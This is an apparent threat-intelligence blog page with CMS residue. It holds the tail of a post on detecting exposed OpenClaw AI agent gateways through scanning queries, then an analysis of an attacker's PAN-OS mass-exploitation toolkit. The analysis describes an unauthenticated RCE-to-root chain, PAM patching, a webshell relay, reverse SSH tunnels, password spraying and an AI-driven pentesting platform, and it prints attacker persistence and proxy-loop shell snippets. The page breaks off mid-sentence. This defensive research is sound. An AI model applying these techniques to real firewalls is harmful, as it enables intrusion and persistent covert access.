characteristics.\n\nOur analysis revealed that many OpenClaw deployments use self-signed certificates with distinctive organization names such as \"Clawdbot\", \"Moltbot\", or \"OpenClaw\" in the certificate fields. Others use certificates from common providers like Let's Encrypt, ZeroSSL, or Cloudflare. The JA4X fingerprints capture these patterns, enabling detection even when the HTTP response content has been modified or is unavailable.\n\nThis detection method found 189 instances with TLS certificates, representing the subset of deployments that have enabled HTTPS. While this is a smaller population than HTTP-only instances, TLS-enabled deployments represent a smaller subset of exposed instances and can be prioritized separately during remediation efforts.\n\nThe following query uses JA4X certificate fingerprints to identify TLS-enabled OpenClaw deployments at the transport layer.\n\n__Query:__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE tls.cert.hash.ja4x IN (\n    'a373a9f83c6b_000000000000_25294184ae24',\n    'a373a9f83c6b_7022c563de38_2e3757343cb0',\n    '7022c563de38_7022c563de38_795797892f9c',\n    '2bab15409345_2bab15409345_795797892f9c',\n    'a373a9f83c6b_7022c563de38_f64f03ad387e',\n    '7d5dbb3783b4_7022c563de38_f64f03ad387e',\n    '2166164053c1_2166164053c1_795797892f9c',\n    'a373a9f83c6b_7022c563de38_2cdf432ec278',\n    'dc020972a4a8_9fb583da09a2_fb02ba79e164'\n)\nAND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 18: JA4X TLS Certificate Fingerprints - 189 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+18.png)\n\n###### Figure 18: JA4X TLS Certificate Fingerprints - 189 Results\n\n### Detection Strategy 7: Content-Length Header\n\nThe HTTP Content-Length header indicates the size of the response body in bytes. For web applications with static index pages like OpenClaw, this value remains consistent across deployments of the same version. The framework's default landing page produces response bodies of characteristic sizes: 671 bytes, 668 bytes, 841 bytes, 670 bytes, 669 bytes, and 667 bytes, depending on the specific version and configuration.\n\nWhile Content-Length alone is not a unique identifier (many applications might produce responses of similar sizes), when combined with port filtering for the CVE-specific ports 18789 and 18791, this simple fingerprint becomes highly effective. The query identified 7,619 instances, demonstrating that even basic HTTP metadata can be valuable for threat hunting when properly contextualized.\n\nThis detection method is particularly useful as a quick validation check or for environments where more sophisticated fingerprinting data may not be available. It can also serve as a first-pass filter to reduce the dataset before applying more computationally expensive analysis techniques.\n\nThis method relies on consistent Content-Length values observed across OpenClaw versions when combined with port filtering.\n\n__Query:__\n\n```sql\nSELECT ip, port, hostname, html.head.title\nFROM httpv2\nWHERE http.headers.content_length IN ('671', '668', '841', '670', '669', '667')\nAND port IN (18789, 18791)\n```\n\nOutput example:\n\n![Figure 19: Content-Length Header with Port Filter - 7,619 Results](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/2-2026/Hunting+OpenClaw+Exposures+CVE-2026-25253+in+Internet-Facing+AI+Agent+Gateways+-+figure+19.png)\n\n###### Figure 19: Content-Length Header with Port Filter - 7,619 Results\n\nCVE-2026-25253 Target Ports\n---------------------------\n\nThe vulnerability specifically affects services running on the default OpenClaw ports documented in the CVE advisory. Understanding the role of each port is essential for both detection and remediation efforts. Port 18789 hosts the main gateway API where the vulnerable authentication export endpoint resides, making it the primary target for exploitation.\n\n|Port|Service|Description|\n|----|-------|-----------|\n|18789|Gateway API|Primary CVE target - /api/export-auth endpoint|\n|18791|Browser Control|Playwright browser automation interface|\n\nMitigation Strategies\n---------------------\n\n1.  __Immediate Network Isolation__: Organizations running OpenClaw, Clawdbot, or Moltbot must immediately restrict network access to ports 18789 and 18791. These services should never be directly exposed to the public internet under any circumstances. Implement firewall rules or network security groups to block inbound connections from untrusted sources.\n\n2.  __Credential Rotation__: Assume that all API keys and authentication tokens stored in any exposed instance have been compromised. Immediately rotate credentials for Claude, OpenAI, Google AI, and any other AI services that were configured in the framework. Review API usage logs for signs of unauthorized access or unusual activity patterns.\n\n3.  __Network Architecture Review__: Never expose browser automation frameworks or AI agent tools directly to the internet. Implement defense-in-depth using VPNs, bastion hosts, zero-trust network access (ZTNA) solutions, or private network segments for remote administration. Consider using reverse proxies with authentication requirements.\n\n4.  __Patch Management__: Apply security patches as soon as they become available from the framework maintainers. Monitor the project repositories and security advisories for updates. Consider implementing automated patch management for development tools and internal applications.\n\nConclusion\n----------\n\nThe number of exposed OpenClaw instances identified across the public internet shows the risk of deploying AI automation tools without proper access controls. With over 17,500 exposed instances identified through our scanning efforts, this vulnerability represents a substantial attack surface that could enable mass credential theft, affecting AI service providers and their customers worldwide.\n\nThe multi-layered detection methodology presented in this report provides security teams with practical, battle-tested queries for identifying vulnerable assets. By combining HTML title matching, header fingerprinting, body hashing, asset identification, certificate analysis, and content-length filtering, organizations can achieve comprehensive coverage for OpenClaw detection across their network perimeter and cloud infrastructure.\n\nIf you want to explore how Hunt.io can be used to track similar exposure patterns or validate findings across your own attack surface, you can [book a demo](https://hunt.io/get-started) to walk through the workflows used in this research.",{"type":6,"value":36},"",{"type":6,"value":36},{"type":6,"value":39},"cGFFSKBQJ","{\"from\":\"4304de0f-b5d3-4ae3-9b63-6ce43cef57ef\",\"limit\":{\"type\":\"LiteralValue\",\"value\":3},\"select\":[{\"collection\":\"UC9uC0xRa\",\"name\":\"EElOb1aRp\",\"type\":\"Identifier\"},{\"collection\":\"UC9uC0xRa\",\"name\":\"qMHRxmf0b\",\"type\":\"Identifier\"},{\"collection\":\"UC9uC0xRa\",\"name\":\"FAm_Miq7W\",\"type\":\"Identifier\"},{\"alias\":\"N4qNADKNH\",\"arguments\":[{\"from\":\"89db1b98-9697-4ae2-b670-96ac6e551fd7\",\"orderBy\":[{\"arguments\":[{\"collection\":\"UC9uC0xRa\",\"name\":\"N4qNADKNH\",\"type\":\"Identifier\"},{\"collection\":\"N4qNADKNH\",\"name\":\"id\",\"type\":\"Identifier\"}],\"functionName\":\"INDEX_OF\",\"type\":\"FunctionCall\"}],\"select\":[{\"collection\":\"N4qNADKNH\",\"name\":\"id\",\"type\":\"Identifier\"}],\"type\":\"Select\",\"where\":{\"left\":{\"collection\":\"N4qNADKNH\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"in\",\"right\":{\"collection\":\"UC9uC0xRa\",\"name\":\"N4qNADKNH\",\"type\":\"Identifier\"},\"type\":\"BinaryOperation\"}}],\"functionName\":\"FLAT_ARRAY\",\"type\":\"FunctionCall\"},{\"collection\":\"UC9uC0xRa\",\"name\":\"de1R1GSeH\",\"type\":\"Identifier\"},{\"collection\":\"UC9uC0xRa\",\"name\":\"ei2alncPv\",\"type\":\"Identifier\"},{\"collection\":\"UC9uC0xRa\",\"name\":\"iDOu5XxRP\",\"type\":\"Identifier\"},{\"collection\":\"UC9uC0xRa\",\"name\":\"id\",\"type\":\"Identifier\"}],\"where\":{\"operator\":\"not\",\"type\":\"UnaryOperation\",\"value\":{\"left\":{\"collection\":\"UC9uC0xRa\",\"name\":\"id\",\"type\":\"Identifier\"},\"operator\":\"==\",\"right\":{\"type\":\"LiteralValue\",\"value\":\"cGFFSKBQJ\"},\"type\":\"BinaryOperation\"}}}default",[42,64,84],{"EElOb1aRp":43,"qMHRxmf0b":45,"FAm_Miq7W":47,"N4qNADKNH":52,"de1R1GSeH":56,"ei2alncPv":58,"iDOu5XxRP":60,"id":62},{"type":6,"value":44},"Inside the PHP2Shell Arsenal: A Complete Dissection of a PAN-OS Mass-Exploitation Open Directory",{"type":6,"value":46},"An exposed open directory revealed a full PAN-OS attack toolkit that chained PHP RCE with a kernel LPE to root 25 Palo Alto firewalls across the US and Korea.",{"type":20,"value":48},{"src":49,"srcSet":50,"pixelWidth":51,"pixelHeight":24},"https://framerusercontent.com/images/UkWiZMaldTxEVYwNctJsZGXGwzs.png?width=961&height=540","https://framerusercontent.com/images/UkWiZMaldTxEVYwNctJsZGXGwzs.png?scale-down-to=512&width=961&height=540 512w,https://framerusercontent.com/images/UkWiZMaldTxEVYwNctJsZGXGwzs.png?width=961&height=540 961w",961,{"type":31,"value":53},[54],{"type":6,"value":55},"YQHce02w9",{"type":17,"value":57},"2026-11-05T00:00:00.000Z",{"type":6,"value":59},"\u003Cstyle>\n    #table{\n        color:  white !important;\n    }\n    #table a{\n        color:  rgba(255, 255, 255, 0.85) !important;\n        text-decoration: underline;\n    }\n    #table a:hover{\n        color:  rgb(147, 147, 147) !important;\n    }\n    #table thead{\n        background-color: white !important;\n        color: black !important;\n    }\n\u003C/style>\n\nIn our previous research, [Hunting Leaked PHP2Shell RCE Across Open Directories](https://hunt.io/blog/php2shell-cve-2026-109618-109619-open-directories) examined the exposure of __CVE-2026-109618__ and __CVE-2026-109619__, uncovering attacker tooling and early exploitation attempts. We followed up in [PHP2Shell One Week Later: Honeypot Shells on the Web, a Path to Root on Palo Alto Firewalls](https://hunt.io/blog/php2shell-honeypot-shells-root-palo-alto-firewalls), documenting confirmed honeypot activity and production compromises involving Palo Alto firewalls. Building on these findings, this post breaks down the Palo Alto exploitation.\n\nOur [AttackCapture™](https://hunt.io/features/attackcapture) platform identified an open directory at [130.94.67[.]235:8080](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8080) containing a fully operational __PAN-OS exploitation toolkit__. The analysis reveals an entire campaign lifecycle including internet-wide reconnaissance of __19,182 management portals__, a chained PHP memory corruption and kernel-level privilege escalation exploit, __25 confirmed root compromises__ across major US and South Korean organizations including lateral pivots to Panorama and managed firewall infrastructure, and a deep post-exploitation playbook targeting Active Directory, GlobalProtect VPN, and Keycloak SSO infrastructure.\n\nHere is what we found inside.\n\nKey Takeaways\n-------------\n\n-   A four-stage exploit chain achieves root-level access on PAN-OS firewalls through a single unauthenticated HTTP request, combining PHP __session.upload_progress__ memory corruption with the __Fragnesia kernel LPE (CVE-2026-46300)__.\n\n-   The exploitation logs across document root access on __25 appliances (18 US, 6 South Korea, 1 internal pivot)__, including lateral movement to a Panorama management server and a managed next-generation firewall within the same enterprise.\n\n-   FOFA-based internet-wide reconnaissance of __19,182 PAN-OS management portals__, version-calibrated target lists, reverse SSH tunnel infrastructure, SOCKS5 proxy pivots, AD/LDAP reconnaissance, __GlobalProtect authentication bypass (CVE-2026-0257)__, and automated persistence and recovery scripts.\n\n-   The operator deployed a multi-agent AI penetration testing platform (aiscan) powered by __DeepSeek v4-pro__, __DeepSeek v4-flash__, and __Kimi k3__.\n\n-   A 4.6 MB session log captures the aiscan AI (DeepSeek v4-pro) autonomously reading 22 offensive playbooks, downloading 17 security tools, and verifying operational readiness in under nine minutes. Anthropic's Claude Code was also installed on the same VPS, though the capture shows no evidence it was used in the attack.\n\n-   Automated health monitoring, crash recovery scripts, and multi-layer boot persistence (systemd, rc.local, preserved health endpoints) indicate a sustained campaign designed to survive appliance reboots and firmware updates.\n\nDiscovery: The Open Directory\n-----------------------------\n\nOn October 24, 2026, our platform flagged an open HTTP file server on port 8080 at [130.94.67[.]235](https://portal.hunt.io/ip/x.x.x.x). The host resolves to [AS154177](https://portal.hunt.io/asn/AS154177) (LIGHT NODE LIMITED), a Tokyo-based VPS provider. Services were observed on ports 22 (SSH), 80, 443, and 8080, with the file server exposing the root home directory of a Linux system containing the operator's complete working environment.\n\n![Figure 1](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+1.png)\n\n###### Figure 1. Hunt.io intelligence for IP address 130.94.67[.]235 shows four security warnings, including potentially malicious open directories detected by AttackCapture.\n\nThe exposed [open directory](https://hunt.io/glossary/open-directories) at [130.94.67[.]235:8080](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8080) includes over 80 Python scripts, shell scripts, and configuration files, along with binary tools, CSV datasets containing the results of internet-wide scanning campaigns, exploitation logs, and Active Directory reconnaissance output.\n\n![Figure 2](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+2.png)\n\n###### Figure 2. The open directory at 130.94.67[.]235:8080 contains 8,790 files across 342 subdirectories, totaling 938 MB of data.\n\nOur analysis exposes the full operational infrastructure, including the reconnaissance pipeline, version-calibrated exploitation batches, post-exploitation tooling for lateral movement and persistence, and authentication bypass utilities for __GlobalProtect VPN__.\n\nIt also contains a complete AI-powered offensive security platform (aiscan) with a 4.6 MB session log that captures a DeepSeek large language model autonomously reading __22 offensive skill files__, downloading __17 security tools__, and preparing for AI-driven penetration testing, alongside a separate installation of __Anthropic's Claude Code__ on the same VPS.\n\nThe Exploit Chain: From HTTP Request to Root Shell\n--------------------------------------------------\n\nThe toolkit's central component is a __four-stage exploit chain__ that achieves root-level command execution on __PAN-OS appliances__ through a single unauthenticated interaction with the management interface. No credentials, no authentication tokens, and no prior access are required. The operator's own documentation (a detailed __README.md__ included in the toolkit) describes the route with precision.\n\nThe chain operates as follows.\n\n### Stage 1: PHP Memory Corruption (RCE as nobody)\n\nThe initial entry point exploits a heap corruption vulnerability in PHP's __session.upload_progress__ handler as exposed through PAN-OS's management web interface. The core exploit logic resides in __panos_rce_poc.py__, which orchestrates the entire four-stage chain from a single invocation.\n\n![Figure 3](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+3.png)\n\n###### Figure 3. Proof-of-concept exploit targeting PAN-OS PHP session.upload_progress vulnerability.\n\nOur analysis confirms three auxiliary scripts found in the open directory linked with the primary exploit. The __precon.py__ script performs pre-exploitation reconnaissance to fingerprint the target's PAN-OS and PHP versions before taking any destructive action. The __prce.py__ encapsulates the PHP RCE primitives used during the memory corruption sequence, and __p121.py__ is a compatibility front-end that adapts the exploit for PAN-OS 12.1.x-specific memory layouts and offsets.\n\nThese __four__ scripts implement the following sequence of HTTP requests that manipulate PHP's internal memory structures:\n\n1.  __The warm-up phase__ primes the PHP process memory layout through controlled allocations.\n\n2.  __A1 (OOM trigger)__ forces an out-of-memory condition that induces a use-after-free on internal zend_reference structures.\n\n3.  __B1 (pointer leak)__ extracts the base address of libphp from the server's Set-Cookie response header, defeating ASLR.\n\n4.  __A2 (stale reference)__ crafts a dangling zend_reference pointing to attacker-controlled memory.\n\n5.  __B2 (command execution)__ constructs a fake HashTable with its pDestructor field set to the address of zif_system, causing PHP's internal cleanup to execute an arbitrary shell command.\n\nThe resulting command execution runs as the __nobody user__ within the httpd_t SELinux context. This alone provides limited access, but the chain doesn't stop there.\n\n### Stage 2: Fragnesia Kernel LPE (CVE-2026-46300)\n\nThe privilege escalation stage exploits [Fragnesia (CVE-2026-46300)](https://portal.hunt.io/vulnerability/cve/CVE-2026-46300), a Linux kernel vulnerability in the __XFRM__ subsystem's page-cache handling. This stage is implemented by __two dedicated payloads__ in the open directory. The __pfrag.py__ contains the Fragnesia kernel exploit variant and webshell dropper, and the __fpatch.py__ handles the PAM configuration patching logic.\n\n![Figure 4](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+4.png)\n\n###### Figure 4. PAN-OS exploit for Fragnesia (CVE-2026-46300) that stages a patcher, writes pam_permit to /etc/pam.d/su, and installs an unauth PHP su-based root relay (webshell).\n\nThe patched PAM configuration replaces the authentication module with __pam_permit.so__, which allows any user to invoke __su__ without a password. The unmodified __setuid /usr/bin/su__ binary then runs within the same B2 HTTP request, elevating the operator from nobody to root.\n\n### Stage 3: Root Relay Installation\n\nWith root access, the exploit automatically replaces the existing unauthenticated __change_password.php__ file with a root-capable command relay that executes commands as root. The original PHP file and PAM configuration are backed up, while the unmodified __health.php__ endpoint is preserved to maintain the B2 re-exploitation path. No additional ports, daemons, or cron jobs are introduced.\n\n### Stage 4: Verification and Persistence\n\nOnce the relay is in place, __three__ additional scripts from the open directory handle verification and long-term persistence. The first script, __install_persist.sh__, is the primary persistence installer that creates a systemd service unit (__pan-ops-init.service__) and an __/etc/rc.local__ hook containing the marker string PANOPSHELL, ensuring the operator's access survives reboots. The second script __persist.sh__ acts as a lightweight check that verifies the PANOPSHELL marker is present in the boot chain.\n\n![Figure 5](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+5.png)\n\n###### Figure 5. Creates /usr/local/lib/.panops, copies keys from /dev/shm, writes a systemd unit, starts a persistent SOCKS proxy, and reverse SSH tunnels to 130.94.67[.]235, target internal ports forwarded.\n\nThe third script, __verify2.sh__, validates the relay, PAM patch, and persistence. A clean __pam_permit__ configuration is written to disk to preserve the relay across PHP restarts. The PAM patch and su invocation must occur within the same B2 request to prevent subsequent memory-intensive exploitation from evicting the patch before it is flushed to disk.\n\n![Figure 6](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+6.png)\n\n###### Figure 6. The four-stage attack chain from unauthenticated HTTP request to persistent root shell. Stages 1 through 3 execute within a single B2 HTTP request.\n\n### Version Matrix\n\nThe toolkit contains hardcoded memory offsets for specific PAN-OS and PHP version combinations. The operator's README documents the following version matrix, which maps PAN-OS releases to the PHP runtime they ship and the corresponding exploitation offsets:\n\n| PAN-OS Version | PHP Version | Calibration Status |\n| --- | --- | --- |\n| 12.1.4 | 8.0.30 | Calibrated |\n| 12.1.9 | 8.0.30 | Provisional |\n| 12.1.10 | 8.0.30 | Provisional |\n| 12.2.3 | 8.0.30 | Provisional |\n| 12.2.4 | 8.0.30 | Provisional |\n| 11.1.6 | 7.4.33 | Unsupported (PHP 7.4) |\n\nThe \"__provisional__\" designation indicates that the operator identified shared memory offsets between certain PAN-OS builds. The toolkit explicitly states that PAN-OS 11.1.6 is unsupported because its PHP 7.4.33 runtime uses different internal structures that have not been calibrated. Exploitation is restricted to the 12.x branch running PHP 8.0.30.\n\nThe Campaign Pipeline: From 19,182 Targets to 25 Roots\n------------------------------------------------------\n\nThe open directory contains a complete set of __CSV files__ that document the operator's systematic approach to target identification and exploitation. This data shows how a mass-exploitation campaign progresses from internet-wide scanning through selective targeting to confirmed compromise.\n\n### Phase 1: Internet-Wide Reconnaissance\n\nThe file __paloalto_all.csv__ contains 19,182 rows representing the results of a FOFA-based scan for exposed PAN-OS management interfaces across the public internet. The scan returned results from __95 countries__, with the following distribution among the top 15:\n\n![Figure 7](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+7.png)\n\n###### Figure 7. Country distribution of 19,182 PAN-OS management interfaces discovered via FOFA reconnaissance. The United States dominates with nearly 25% of all exposed portals.\n\n### Phase 2: Version Fingerprinting\n\nThe operator's batch scanning tool (__batch_scan.py__) was run against all 19,182 hosts with __200 concurrent workers__ and a 10-second timeout. The results were triaged into __three__ categories:\n\n![Figure 8](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+8.png)\n\n###### Figure 8. Version distribution among 4,590 fingerprinted PAN-OS hosts. Versions in 12.x fall within the exploit's supported range, whereas other PAN-OS 11.x versions, which use PHP 7.4 and are not exploitable by this toolkit.\n\nThe total count of hosts running exploitable 12.x firmware was __631__, representing approximately 13.7% of all versioned hosts and just 3.3% of the original reconnaissance set.\n\n### Phase 3: Targeted Exploitation\n\nFrom the __631 exploitable hosts__, the operator further filtered to a batch of __240 targets__ concentrated in __four__ countries: the United States (219), China (9), South Korea (6), and Japan (6).\n\nThe exploitation batch runner then attempted the full __four-stage chain__ against each host, with results logged to individual per-target log files.\n\n![Figure 9](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+9.png)\n\n###### Figure 9. The campaign funnel showing progressive target reduction from 19,182 FOFA reconnaissance results to 25 confirmed root compromises, representing a 0.13% end-to-end conversion rate.\n\n#### Exploitation Results\n\nThe 25 confirmed root compromises are recorded across four separate CSV files within the open directory, each corresponding to a different exploitation phase or target class.\n\n| File | Records | Description |\n| --- | --- | --- |\n| __ok.csv__ | 21 | Primary internet-facing exploitation batch |\n| __success2.csv__ | 2 | Secondary exploitation round targeting US cloud-hosted appliances |\n| __pano_ok.csv__ | 1 | Panorama management server reached via internal reverse tunnel |\n| __mpnf_success.csv__ | 1 | Managed next-generation firewall (MPNF) within the same enterprise |\n\nThe compromised appliances were hosted on networks operated by major cloud providers (__Microsoft Azure, Amazon Web Services, Oracle Cloud__), telecom carriers (__Korea Telecom, SK Broadband__), and colocation and network providers (__Zayo Bandwidth, Equinix__). These providers were not breached. The rooted devices are customer-run PAN-OS firewalls deployed on their networks. Separately, one of the 25 compromises was a managed firewall instance inside a US defense-sector organization. Individual exploitation attempts averaged between __6 and 13 minutes__ per target, as recorded in the batch_elapsed field of the success logs.\n\nThe analysis of the CSV shows 25 rows that contain the full command output confirming __uid=0(root)__ and the kernel version string. We have mapped the victim countries and exploited versions in the graph below.\n\n![Figure 10](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+10.png)\n\n###### Figure 10. Breakdown of all 25 confirmed root compromises by country/access path and PAN-OS version. The US accounts for 72% of successful exploitations, with versions 12.1.4 and 12.1.7 tied as the most commonly rooted releases.\n\nPost-Exploitation: Deep Enterprise Compromise\n---------------------------------------------\n\nThe open directory reveals that on at least one compromised host, the operator moved well beyond initial root access into a sustained, multi-week intrusion focused on a US defense-sector organization. The post-exploitation toolkit points to careful planning and a clear objective: establish persistent, covert access to the internal enterprise network through the compromised firewall.\n\n### Persistence Mechanisms\n\nThe script __install_persist.sh__ installs boot-durable persistence that survives appliance reboots. It operates in three layers:\n\n__Layer 1: Payload staging__. SSH keys, a SOCKS5 proxy script, and tunneling scripts are copied from the ephemeral __/dev/shm__ staging area to a hidden directory on the persistent root filesystem at __/usr/local/lib/.panops__, with restrictive permissions (mode 700 for the directory, 600 for the private key).\n\n__Layer 2: Systemd service__. A systemd unit named __pan-ops-init.service__ is created and enabled under the __multi-user.target__. The unit is typed as oneshot with RemainAfterExit=yes, described innocuously as \"PAN-os Operations Init (post-boot management bridge)\". On boot, it spawns the SOCKS5 proxy and reverse SSH tunnel loops.\n\n![Figure 11](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+11.png)\n\n###### Figure 11. Systemd service unit extracted from install_persist.sh. The service description is deliberately crafted to appear as a legitimate PAN-OS management component.\n\n__Layer 3: rc.local fallback__. As a belt-and-braces measure, a hook is appended to __/etc/rc.d/rc.local__ with the marker string PANOPSHELL, ensuring the persistence survives even if systemd unit loading is disrupted during a firmware update. The script checks for the marker before appending to avoid duplicate entries.\n\n```bash\ngrep -q PANOPSHELL /etc/rc.d/rc.local 2>/dev/null ||\n  printf '\\n# PANOPSHELL\\n/bin/sh /usr/local/lib/.panops/start.sh >/dev/null 2>&1\\n'\n  >> /etc/rc.d/rc.local\nchmod 755 /etc/rc.d/rc.local\n```\n\n### Reverse SSH Tunneling and SOCKS5 Proxy\n\nThe tunneling infrastructure creates a bidirectional bridge between the compromised firewall's internal network and the operator's VPS. The script __tun.sh__ establishes persistent reverse SSH tunnels that map __eight internal network services__ to localhost ports on the VPS at 130.94.67[.]235:\n\n![Figure 12](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+12.png)\n\n###### Figure 12. Reverse SSH tunnel configuration from tun.sh. The tunnel provides the operator with access to the domain controller (LDAP/LDAPS/RDP), internal SSH hosts, a GlobalProtect gateway, and the SOCKS5 proxy for arbitrary network access.\n\nThe tunnel mapping reveals the operator's specific targets within the compromised network: the Active Directory domain controller (LDAP on port 389, LDAPS on port 636, and RDP on port 3389), __two__ internal SSH servers, an internal HTTPS application, and the GlobalProtect VPN gateway. The SOCKS5 tunnel on port 10700 provides a general-purpose proxy that gives the operator arbitrary access to the entire x.x.x.x/16 internal network range from their VPS.\n\nThe SOCKS5 proxy itself (__socks.py__) is a minimal, threaded implementation supporting CONNECT operations only, designed to be started with setsid so it survives the PHP relay request that launches it. A supervisor script (__socksloop.sh__) monitors the proxy and restarts it automatically if it crashes or reaches its one-hour timeout.\n\n```bash\n#!/bin/sh\n# supervisor: keep the SOCKS5 server alive on x.x.x.x:10700\nwhile :; do\n  echo \"$(date -u) socks start\" >> /tmp/socksloop.log\n  timeout 3600 python3 /dev/shm/.socks.py 10700 >> /tmp/socks.log 2>&1\n  echo \"$(date -u) socks exit $?\" >> /tmp/socksloop.log\n  sleep 3\ndone\n```\n\n\u003Cbr>\n\n![Figure 13](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+13.png)\n\n###### Figure 13. Post-exploitation flow diagram showing the three primary vectors: boot persistence (systemd and rc.local), reverse tunnel infrastructure (providing access to AD, RDP, and arbitrary internal hosts), and lateral movement tooling (LDAP enumeration, password spraying, SSO probing).\n\n### Active Directory Reconnaissance\n\nThe directory contains multiple AD reconnaissance scripts of increasing sophistication. The primary tool (__adacl.py__) performs LDAP-based enumeration of the target domain, querying for users, groups, group memberships, computer objects, and access control lists (ACLs). The script was served to compromised firewalls directly from the VPS HTTP server on port 8080, as confirmed by the recovery automation in __watch_recover.sh__:\n\n![Figure 14](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+14.png)\n\n###### Figure 14. Automated recovery script from watch_recover.sh. When the compromised firewall comes back online (confirmed by a root shell check), the script immediately fetches the AD reconnaissance tool from the VPS file server and deploys it.\n\nThe AD tooling also includes __ldtest.py__ (LDAP connection testing), __miner.py__ (data extraction), __keys1.py__ (SSH key harvesting), and __secrets2.py__ (credential extraction from PAN-OS configuration).\n\nThe file __spray.py__ implements a password spraying attack against authentication endpoints discovered during the reconnaissance phase. The operator appears to have targeted both LDAP bind authentication and Keycloak SSO token endpoints, attempting common passwords across enumerated user accounts.\n\n#### Panorama Pivot\n\nThe script __deploy.sh__ provides a file transfer mechanism that moves payloads from the VPS to other compromised hosts through the root relay. It ships files via base64-encoded POST chunks, using the compromised __change_password.php__ relay as a command transport.\n\n__Note__: The target in the discovered script is a second compromised host identified in the CSV data as a Panorama management appliance, indicating the operator expanded from a single firewall compromise to the centralized management platform.\n\n![Figure 15](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+15.png)\n\n###### Figure 15. File deployment mechanism from deploy.sh. Files are base64-encoded, chunked into 24 KB segments, and transmitted as POST data to the root relay on the compromised Panorama appliance.\n\nOperational Verification and Cleanup\n------------------------------------\n\nThe operator was disciplined about cleanup. The script __verify2.sh__ performs a comprehensive post-installation check: confirming the systemd unit is enabled and active, verifying payload files are present in __/usr/local/lib/.panops__, checking that tunnel and proxy worker processes are running, and auditing /dev/shm and /tmp for residual artifacts.\n\nThe cleanup script __finalize.sh__ takes an additional step: it kills all running workers, stops the systemd unit, then restarts it, proving that the persistence mechanism correctly survives a clean restart cycle. After verification, it removes approximately 30 staged scripts from __/dev/shm__ while preserving the persistence payload on the root filesystem. The cleanup script __clean3.sh__ performs a separate sweep of scratch files and verifies that PAN-OS native shared-memory files remain intact.\n\n![Figure 16](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+16.png)\n\n###### Figure 16. Operational verification script from verify2.sh, demonstrating the operator's systematic approach to confirming persistence, checking for running processes, and auditing forensic trace surfaces.\n\nGlobalProtect Authentication Bypass (CVE-2026-0257)\n---------------------------------------------------\n\nBeyond the PAN-OS exploitation chain, the open directory contains forge_cookie.py, a standalone tool that exploits [CVE-2026-0257](https://portal.hunt.io/vulnerability/cve/CVE-2026-0257) to forge GlobalProtect authentication override cookies. The tool requires no credentials and no prior access to the target.\n\nIts technique:\n\n1.  Connect to the target over TLS and extract the CA certificate from the handshake (forcing TLS 1.2 so the Certificate message is sent in plaintext).\n\n2.  Extract the public key from the certificate.\n\n3.  Encrypt a forged authentication cookie for a specified username using RSA public-key padding.\n\n4.  Submit the forged cookie to the GlobalProtect gateway and portal endpoints to bypass authentication entirely.\n\nThe presence of this tool alongside the PAN-OS RCE chain indicates the operator maintained a toolkit for multiple Palo Alto Networks attack vectors. Once inside the network via the firewall exploit, the GlobalProtect bypass provides an alternative persistence and access mechanism through the organization's VPN infrastructure, which would survive the firewall being reimaged or 